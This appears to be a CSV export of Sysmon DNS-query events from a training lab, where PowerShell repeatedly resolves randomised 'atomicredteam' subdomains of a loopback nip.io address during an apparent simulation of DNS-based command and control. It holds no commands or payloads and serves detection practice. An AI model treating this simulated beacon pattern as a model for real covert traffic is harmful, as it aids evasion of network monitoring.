"2025-12-22 13:58:22.883 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165679,"Query: atomicredteam-126903.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:22.133","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:22.883 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165680,"Query: atomicredteam-777461.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:22.309","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:22.883 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165681,"Query: atomicredteam-64685.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:22.354","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:22.884 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165682,"Query: atomicredteam-4424.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:22.397","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:22.884 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165683,"Query: atomicredteam-140919.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:22.439","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:22.887 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165684,"Query: atomicredteam-332418.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:22.482","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:22.887 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165685,"Query: atomicredteam-517047.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:22.526","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:22.887 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165686,"Query: atomicredteam-420684.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:22.570","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:23.885 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165687,"Query: atomicredteam-460208.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:22.741","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:23.885 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165688,"Query: atomicredteam-256612.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:22.785","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:23.885 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165689,"Query: atomicredteam-141507.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:22.955","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:23.885 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165690,"Query: atomicredteam-262968.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:22.997","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:23.885 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165691,"Query: atomicredteam-573150.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:23.038","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:23.886 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165692,"Query: atomicredteam-486133.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:23.219","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:23.886 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165693,"Query: atomicredteam-480940.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:23.262","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:23.886 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165694,"Query: atomicredteam-920849.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:23.444","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:23.887 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165695,"Query: atomicredteam-51550.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:23.486","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:24.896 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165696,"Query: atomicredteam-947588.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:23.658","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:24.897 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165697,"Query: atomicredteam-389195.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:23.978","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:24.897 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165698,"Query: atomicredteam-338568.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:24.020","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:24.897 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165699,"Query: atomicredteam-630521.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:24.065","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:24.897 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165700,"Query: atomicredteam-977788.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:24.108","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:24.897 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165701,"Query: atomicredteam-144236.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:24.150","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:24.897 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165702,"Query: atomicredteam-445582.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:24.193","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:24.898 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165703,"Query: atomicredteam-63175.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:24.236","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:24.898 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165704,"Query: atomicredteam-548823.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:24.279","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:24.898 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165705,"Query: atomicredteam-968836.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:24.322","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:24.899 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165706,"Query: atomicredteam-106526.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:24.365","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:24.899 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165707,"Query: atomicredteam-110762.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:24.409","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:24.899 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165708,"Query: atomicredteam-779957.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:24.453","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:24.899 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165709,"Query: atomicredteam-271251.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:24.495","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:24.899 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165710,"Query: atomicredteam-449418.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:24.538","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:24.899 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165711,"Query: atomicredteam-25394.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:24.583","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:25.909 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165712,"Query: atomicredteam-707233.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:24.903","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:25.909 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165713,"Query: atomicredteam-523193.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:25.077","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:25.910 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165714,"Query: atomicredteam-510737.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:25.120","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:25.910 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165715,"Query: atomicredteam-513026.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:25.441","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:25.910 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165716,"Query: atomicredteam-96589.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:25.486","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:25.910 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165717,"Query: atomicredteam-380774.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:25.528","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:25.910 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165718,"Query: atomicredteam-479820.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:25.571","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:25.910 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165719,"Query: atomicredteam-893107.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:25.615","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:25.911 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165720,"Query: atomicredteam-973941.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:25.658","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:25.911 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165721,"Query: atomicredteam-394883.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:25.703","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:25.911 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165722,"Query: atomicredteam-414566.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:25.748","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:26.911 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165723,"Query: atomicredteam-186419.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:25.791","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:26.911 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165724,"Query: atomicredteam-876958.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:25.836","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:26.911 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165725,"Query: atomicredteam-439677.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:25.880","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:26.911 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165726,"Query: atomicredteam-893009.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:25.924","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:26.911 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165727,"Query: atomicredteam-610243.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:25.966","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
